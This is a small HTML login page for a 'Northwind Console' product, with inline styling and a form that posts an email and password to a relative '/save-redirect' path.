<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Northwind Console · Sign in</title>
<style>
  body { margin: 0; min-height: 100vh; display: grid; place-items: center; font: 15px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; color: #1c2430; background: radial-gradient(1200px 600px at 10% -10%, #dfe9ff 0, transparent 60%), radial-gradient(900px 500px at 110% 110%, #e6f4ec 0, transparent 60%), #f5f7fb; }
  main { width: 380px; padding: 36px; border-radius: 18px; background: #fff; box-shadow: 0 20px 60px #1c243014, 0 2px 8px #1c24300f; }
  .logo { display: flex; align-items: center; gap: 10px; font-weight: 700; font-size: 18px; } .logo i { width: 30px; height: 30px; border-radius: 8px; background: linear-gradient(135deg, #3767f0, #6b4ff0); }
  h1 { margin: 22px 0 4px; font-size: 24px; letter-spacing: -.4px; } p { margin: 0 0 20px; color: #5b6676; }
  label { display: block; margin: 14px 0 6px; font-size: 13px; font-weight: 600; } input { box-sizing: border-box; width: 100%; padding: 11px 12px; border: 1px solid #cdd5e1; border-radius: 9px; font: inherit; }
  button { width: 100%; margin-top: 22px; padding: 11px; border: 0; border-radius: 9px; background: #3767f0; color: #fff; font: 600 15px/1.2 inherit; }
</style></head>
<body><main><div class="logo"><i></i>Northwind Console</div><h1>Sign in</h1><p>Welcome back. Use your work account.</p>
<form method="post" action="/save-redirect"><label for="email">Email</label><input id="email" name="email" type="email" autocomplete="username"><label for="password">Password</label><input id="password" name="password" type="password" autocomplete="current-password"><button>Sign in</button></form></main></body></html>
